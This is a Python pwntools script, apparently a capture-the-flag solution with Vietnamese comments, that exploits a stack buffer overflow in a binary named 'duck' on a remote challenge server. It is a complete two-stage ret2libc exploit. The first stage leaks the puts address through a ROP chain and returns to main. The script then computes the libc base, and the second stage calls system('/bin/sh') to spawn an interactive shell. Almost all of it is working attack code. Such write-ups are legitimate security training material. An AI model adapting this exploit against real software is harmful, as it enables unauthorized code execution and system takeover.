# solve.py
from pwn import *

# Cài đặt context
context.binary = elf = ELF('./duck')
libc = ELF('./libc.so.6')

# --- CHẾ ĐỘ KẾT NỐI ---
p = remote('chall.v1t.site', 30212)

# --- Tìm gadget và lấy địa chỉ cần thiết ---
rop = ROP(elf)
ret_gadget = rop.find_gadget(['ret'])[0]
log.info(f"Found a 'ret' gadget at: {hex(ret_gadget)}")

padding = b'A' * 312
puts_plt = elf.plt['puts']
puts_got = elf.got['puts']
main_addr = elf.symbols['main']


# --- Giai đoạn 1: Leak địa chỉ bằng puts() và quay về main() ---
payload1 = flat([
    padding,
    puts_plt,
    main_addr,     # Quay về main để flush buffer và overflow lần 2
    puts_got       # Đối số cho puts
])

# Dọn dẹp banner đầu tiên
p.recvuntil(b'Make your own feather here!\n')
log.info("Cleared first banner.")

# Gửi payload 1
p.sendline(payload1)
log.info("Sent payload 1 (leak via puts, return to main).")

# Đọc dòng đầu tiên trả về, đó chính là địa chỉ bị leak
leaked_line = p.recvline()
leaked_puts = u32(leaked_line.strip().ljust(4, b'\x00'))
log.success(f"Leaked puts address: {hex(leaked_puts)}")


# --- Giai đoạn 2: Gọi system('/bin/sh') ---
libc.address = leaked_puts - libc.symbols['puts']
log.info(f"Calculated libc base address: {hex(libc.address)}")

system_addr = libc.symbols['system']
binsh_addr = next(libc.search(b'/bin/sh'))
exit_addr = libc.symbols['exit']

log.info(f"system address: {hex(system_addr)}")
log.info(f"/bin/sh string address: {hex(binsh_addr)}")

# Payload 2 với offset đúng và ret gadget
payload2 = flat([
    padding,
    ret_gadget,
    system_addr,
    exit_addr,
    binsh_addr
])

# Dọn dẹp banner thứ hai được in ra trước khi gửi payload cuối
p.recvuntil(b'Make your own feather here!\n')
log.info("Cleared second banner.")

# Gửi payload 2
p.sendline(payload2)
log.info("Sent payload 2 (shell).")

# Chuyển sang chế độ tương tác để nhận shell
p.interactive()